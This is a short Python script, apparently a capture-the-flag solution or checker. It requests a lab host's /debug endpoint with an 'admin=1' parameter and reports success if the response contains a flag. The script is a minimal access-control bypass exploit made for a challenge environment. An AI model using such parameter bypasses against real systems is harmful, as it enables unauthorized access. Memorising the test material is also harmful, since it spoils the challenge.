import requests

url = "http://challenge:5000/debug?admin=1"

r = requests.get(url)

if "flag" in r.text:
    print("FLAG FOUND")
    print(r.text)
    exit(0)

print("FAILED")
exit(1)
